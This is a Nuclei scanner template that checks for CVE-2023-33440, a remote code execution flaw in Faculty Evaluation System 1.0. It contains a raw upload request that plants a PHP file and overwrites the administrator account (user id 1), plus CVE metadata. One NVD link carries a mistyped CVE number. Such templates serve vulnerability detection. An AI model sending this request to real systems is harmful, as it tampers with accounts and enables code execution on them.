http:
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code_1 == 200
    - regex("^1$", body_1)
    - '!regex("^2$", body_1)'
    - len(body_1) == 1
    - contains(body_2, "Faculty Evaluation")
    type: dsl
  raw:
  - 'POST /ajax.php?action=save_user HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------1037163726497


    -----------------------------1037163726497

    Content-Disposition: form-data; name="id"


    1

    -----------------------------1037163726497

    Content-Disposition: form-data; name="firstname"


    Administrator

    -----------------------------1037163726497

    Content-Disposition: form-data; name="lastname"


    a

    -----------------------------1037163726497

    Content-Disposition: form-data; name="img"; filename="{{randstr}}.php"

    Content-Type: application/octet-stream


    <?php echo md5(''CVE-2023-33440''); ?>

    -----------------------------1037163726497

    Content-Disposition: form-data; name="email"


    {{email}}

    -----------------------------1037163726497

    Content-Disposition: form-data; name="password"



    -----------------------------1037163726497

    Content-Disposition: form-data; name="cpass"



    -----------------------------1037163726497--

    '
  - 'GET /login.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-33440
info:
  author: Harsh
  classification:
    cpe: cpe:2.3:a:faculty_evaluation_system_project:faculty_evaluation_system:1.0:*:*:*:*:*:*:*
    cve-id: CVE-2023-33440
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.2
    cwe-id: CWE-434
    epss-percentile: 0.92178
    epss-score: 0.05129
  description: 'Sourcecodester Faculty Evaluation System v1.0 is vulnerable to arbitrary
    code execution via /eval/ajax.php?action=save_user.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  metadata:
    max-request: 2
    product: faculty_evaluation_system
    vendor: faculty_evaluation_system_project
    verified: true
  name: Faculty Evaluation System v1.0 - Remote Code Execution
  reference:
  - http://packetstormsecurity.com/files/172672/Faculty-Evaluation-System-1.0-Shell-Upload.html
  - https://github.com/F14me7wq/bug_report/blob/main/vendors/oretnom23/faculty-evaluation-system/RCE-1.md
  - https://nvd.nist.gov/vuln/detail/CVE-2023-333440
  remediation: 'Apply the latest security patches and updates provided by the vendor
    to mitigate this vulnerability.

    '
  severity: high
  tags: packetstorm,cve,cve2023,faculty,rce,intrusive,faculty_evaluation_system_project
variables:
  email: '{{randstr}}@{{rand_base(5)}}.com'
